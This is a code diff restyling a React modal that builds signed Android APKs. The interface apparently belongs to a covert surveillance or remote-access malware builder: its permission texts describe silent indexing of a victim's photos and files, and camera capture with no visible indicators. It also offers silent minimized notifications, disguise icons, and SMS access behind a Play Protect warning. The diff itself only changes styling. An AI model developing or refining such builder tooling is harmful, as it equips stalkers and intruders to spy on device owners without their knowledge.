                             {/* Dropdown 3: Status Bar Icon */}
                             <div className="relative">
-                                <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
+                                <label className="block text-[10px] font-bold text-white/50 uppercase tracking-wider mb-1">
                                     Status Bar Tray Icon
                                 </label>
                                 <button
@@ -1195,9 +1198,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setIsStyleMenuOpen(false);
                                         setIsActionMenuOpen(false);
                                     }}
-                                    className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
+                                    className="w-full bg-black/40 border border-white/10 hover:border-orange-500/40 rounded-2xl p-3 flex items-center justify-between text-left transition-all cursor-pointer"
                                 >
-                                    <div className="flex items-center gap-3">
+                                    <div className="flex items-center gap-2.5">
                                         <span className="text-lg">{ICON_OPTIONS[notificationIcon]?.symbol || "ℹ️"}</span>
                                         <span className="text-xs font-bold text-white">
                                             {ICON_OPTIONS[notificationIcon]?.label || "Info Badge"}
@@ -1207,7 +1210,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </button>
 
                                 {isIconMenuOpen && (
-                                    <div className="mt-2 bg-[#0c0e12] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in z-20 relative">
+                                    <div className="mt-1.5 bg-[#14161b] border border-white/15 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in z-20 relative">
                                         {Object.entries(ICON_OPTIONS).map(([key, item]) => (
                                             <button
                                                 key={key}
@@ -1216,7 +1219,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     setNotificationIcon(key);
                                                     setIsIconMenuOpen(false);
                                                 }}
-                                                className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
+                                                className={`w-full p-2.5 sm:p-3 flex items-center justify-between text-left transition-colors cursor-pointer ${
                                                     notificationIcon === key ? 'bg-orange-500/15 text-orange-300 font-bold' : 'hover:bg-white/5 text-white/70'
                                                 }`}
                                             >
@@ -1232,7 +1235,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             </div>
 
                             {/* Live Notification Drawer Preview */}
-                            <div className="clay-card p-4 rounded-3xl space-y-2">
+                            <div className="p-3.5 rounded-3xl bg-black/40 border border-white/10 space-y-2">
                                 <div className="flex items-center justify-between text-[10px] font-mono text-white/40">
                                     <span className="flex items-center gap-1.5 text-orange-300 font-bold">
                                         <span className="w-1.5 h-1.5 rounded-full bg-orange-400 animate-pulse" />
@@ -1241,9 +1244,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <span>Silent • Minimized</span>
                                 </div>
 
-                                <div className="clay-capsule p-3 rounded-2xl flex items-center justify-between gap-3">
+                                <div className="p-3 rounded-2xl bg-black/60 border border-white/5 flex items-center justify-between gap-3">
                                     <div className="flex items-center gap-3">
-                                        <div className="clay-icon-pod w-9 h-9 rounded-xl flex items-center justify-center text-lg">
+                                        <div className="w-9 h-9 rounded-xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-lg">
                                             {ICON_OPTIONS[notificationIcon]?.symbol || NOTIFICATION_PRESETS[notificationStyle]?.icon}
                                         </div>
                                         <div>
@@ -1264,16 +1267,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     )}
                 </div>
 
-                {/* ── Footer Action HUD ── */}
-                <div className="p-4 sm:p-6 border-t border-white/5 bg-black/40 flex flex-col gap-3 flex-shrink-0">
+                {/* ── Footer Navigation Bar (Clean Staff-Level High-Contrast Buttons) ── */}
+                <div className="p-3.5 sm:p-6 border-t border-white/5 bg-black/50 flex flex-col gap-3 flex-shrink-0">
                     
                     {/* Compilation Status HUD */}
                     {status !== 'idle' && (
-                        <div className="clay-card p-4 rounded-2xl flex flex-col items-center justify-center text-center space-y-2.5 animate-in fade-in">
+                        <div className="p-3.5 rounded-2xl bg-black/80 border border-orange-500/30 flex flex-col items-center justify-center text-center space-y-2.5 animate-in fade-in">
                             {status === 'queued' ? (
                                 <>
-                                    <div className="w-8 h-8 border-3 border-orange-500/30 border-t-orange-500 rounded-full animate-spin" />
-                                    <h4 className="text-xs font-bold text-white">Queued in Build Pipeline</h4>
+                                    <div className="w-7 h-7 border-3 border-orange-500/30 border-t-orange-500 rounded-full animate-spin" />
+                                    <h4 className="text-xs font-bold text-white">Queued in Compilation Queue</h4>
                                     <p className="text-[10px] font-mono text-white/40">Queue Position: <span className="text-orange-300 font-bold">{queuePosition}</span></p>
                                 </>
                             ) : status === 'generating' ? (
@@ -1291,7 +1294,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </>
                             ) : status === 'completed' ? (
                                 <>
-                                    <CheckCircle2 size={30} className="text-emerald-400" />
+                                    <CheckCircle2 size={28} className="text-emerald-400" />
                                     <h4 className="text-sm font-black text-white">APK Compilation Ready!</h4>
                                     <p className="text-[10px] font-mono text-white/40">Signed with Android V2/V3 schemes.</p>
                                     {downloadUrl && (
@@ -1300,7 +1303,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             target="_blank"
                                             rel="noopener noreferrer"
                                             download={`${activeApp.name.replace(/\s+/g, '_')}.apk`}
-                                            className="clay-cta-button px-6 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider flex items-center gap-2 shadow-lg transition-transform hover:scale-105 active:scale-95 cursor-pointer"
+                                            className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-black font-black text-xs uppercase tracking-wider flex items-center gap-2 shadow-[0_4px_16px_rgba(16,185,129,0.4)] transition-transform hover:scale-105 active:scale-95 cursor-pointer"
                                         >
                                             <Download size={14} /> Download APK
                                         </a>
@@ -1310,15 +1313,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* Step Navigation Buttons */}
-                    <div className="flex items-center justify-between gap-3">
+                    {/* Step Navigation & Action Buttons */}
+                    <div className="flex items-center justify-between gap-2.5 sm:gap-3">
                         {activeStep !== 'identity' ? (
                             <button
                                 type="button"
                                 onClick={() => setActiveStep(activeStep === 'notifications' ? 'permissions' : 'identity')}
-                                className="clay-capsule px-4 py-2.5 rounded-xl text-white/60 hover:text-white font-mono font-bold text-xs uppercase tracking-wider transition-all cursor-pointer"
+                                className="px-4 sm:px-5 py-2.5 sm:py-3 rounded-xl bg-white/5 hover:bg-white/10 text-white/70 hover:text-white font-bold text-xs flex items-center gap-1.5 border border-white/10 transition-all cursor-pointer"
                             >
-                                ← Previous
+                                <ArrowLeft size={14} />
+                                <span>Previous</span>
                             </button>
                         ) : <div />}
 
@@ -1326,24 +1330,25 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep(activeStep === 'identity' ? 'permissions' : 'notifications')}
-                                className="clay-cta-button px-6 py-2.5 rounded-xl font-black text-xs uppercase tracking-wider flex items-center gap-1.5 transition-all hover:scale-105 active:scale-95 cursor-pointer"
+                                className="px-5 sm:px-6 py-2.5 sm:py-3 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-black font-black text-xs uppercase tracking-wider flex items-center gap-1.5 shadow-[0_4px_18px_rgba(249,115,22,0.35)] transition-all hover:scale-105 active:scale-95 cursor-pointer"
                             >
                                 <span>Next Step</span>
-                                <ChevronRight size={14} />
+                                <ArrowRight size={14} />
                             </button>
                         ) : status === 'idle' ? (
                             <button
                                 type="button"
                                 onClick={startGeneration}
-                                className="clay-cta-button px-8 py-3 rounded-2xl font-black text-xs sm:text-sm uppercase tracking-widest flex items-center gap-2 transition-transform hover:scale-105 active:scale-95 shadow-[0_8px_24px_rgba(249,115,22,0.5)] cursor-pointer"
+                                className="px-6 sm:px-8 py-2.5 sm:py-3.5 rounded-xl bg-gradient-to-r from-orange-500 via-amber-500 to-yellow-500 hover:from-orange-400 hover:to-amber-400 text-black font-black text-xs sm:text-sm uppercase tracking-wider flex items-center gap-2 shadow-[0_6px_25px_rgba(249,115,22,0.45)] transition-all hover:scale-105 active:scale-95 cursor-pointer"
                             >
-                                <Zap size={15} /> Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK
+                                <Zap size={15} />
+                                <span>Build {selectedPreset === 'custom' ? 'Custom' : activeApp.name} APK</span>
                             </button>
                         ) : (
                             <button
                                 type="button"
                                 onClick={onClose}
-                                className="clay-capsule px-5 py-2.5 rounded-xl text-white/60 hover:text-white font-mono font-bold text-xs uppercase transition-all cursor-pointer"
+                                className="px-5 py-2.5 rounded-xl bg-white/10 hover:bg-white/20 text-white font-bold text-xs transition-all cursor-pointer"
                             >
                                 Close
                             </button>
@@ -1354,10 +1359,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 {/* ── Sub-Modals (Info & Warnings) ── */}
                 {showAppInfoModal && (
                     <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/80 backdrop-blur-md p-4" onClick={() => setShowAppInfoModal(null)}>
-                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                        <div className="bg-[#181a20] border border-white/15 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                             <button
                                 onClick={() => setShowAppInfoModal(null)}
-                                className="clay-button-sm w-8 h-8 rounded-lg flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
+                                className="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                             >
                                 <X size={14} />
                             </button>
@@ -1374,7 +1379,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
-                            <div className="clay-coords-badge p-3.5 rounded-2xl">
+                            <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
                                 <h5 className="text-xs font-bold text-orange-300 mb-1">
                                     {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                 </h5>
@@ -1385,7 +1390,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                             <button
                                 onClick={() => setShowAppInfoModal(null)}
-                                className="clay-cta-button w-full py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
+                                className="w-full py-2.5 rounded-xl bg-orange-500 hover:bg-orange-600 text-black font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
                             >
                                 Got It
                             </button>
@@ -1396,9 +1401,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 {/* Play Protect Warning Modal */}
                 {showPlayProtectWarning && (
                     <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[350] p-4" onClick={() => setShowPlayProtectWarning(false)}>
-                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full border border-red-500/30 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
+                        <div className="bg-[#181a20] border border-red-500/30 rounded-3xl p-5 sm:p-6 max-w-sm w-full shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
                             <div className="flex items-center gap-3">
-                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-red-400">
+                                <div className="w-10 h-10 rounded-xl bg-red-500/15 border border-red-500/30 flex items-center justify-center text-red-400">
                                     <AlertTriangle size={20} />
                                 </div>
                                 <div>
@@ -1415,7 +1420,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 <button
                                     type="button"
                                     onClick={() => setShowPlayProtectWarning(false)}
-                                    className="clay-capsule flex-1 py-2.5 rounded-xl text-white/60 hover:text-white text-xs font-bold transition-all cursor-pointer"
+                                    className="flex-1 py-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white/60 hover:text-white text-xs font-bold transition-all cursor-pointer"
                                 >
                                     Cancel
                                 </button>
@@ -1425,7 +1430,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         setEnableSmsPermission(true);
                                         setShowPlayProtectWarning(false);
                                     }}
-                                    className="clay-card-error flex-1 py-2.5 rounded-xl text-red-300 hover:text-white text-xs font-bold transition-all cursor-pointer"
+                                    className="flex-1 py-2.5 rounded-xl bg-red-500 hover:bg-red-600 text-white text-xs font-bold transition-all cursor-pointer"
                                 >
                                     Enable SMS
                                 </button>
@@ -1437,16 +1442,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 {/* Permission Info Modal */}
                 {showPermissionInfo && (
                     <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/80 backdrop-blur-md p-4" onClick={() => setShowPermissionInfo(null)}>
-                        <div className="clay-card rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                        <div className="bg-[#181a20] border border-white/15 rounded-3xl p-5 sm:p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
-                                className="clay-button-sm w-8 h-8 rounded-lg flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
+                                className="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
                             >
                                 <X size={14} />
                             </button>
 
                             <div className="flex items-center gap-3">
-                                <div className="clay-icon-pod w-10 h-10 rounded-xl flex items-center justify-center text-orange-400">
+                                <div className="w-10 h-10 rounded-xl bg-orange-500/10 border border-orange-500/20 flex items-center justify-center text-orange-400">
                                     <Info size={20} />
                                 </div>
                                 <div>
@@ -1455,7 +1460,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
-                            <div className="clay-coords-badge p-3.5 rounded-2xl">
+                            <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
                                 <p className="text-xs text-white/75 leading-relaxed font-sans">
                                     {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                     {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
@@ -1469,7 +1474,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                             <button
                                 onClick={() => setShowPermissionInfo(null)}
-                                className="clay-cta-button w-full py-2.5 rounded-xl font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
+                                className="w-full py-2.5 rounded-xl bg-orange-500 hover:bg-orange-600 text-black font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
                             >
                                 Got It
                             </button>
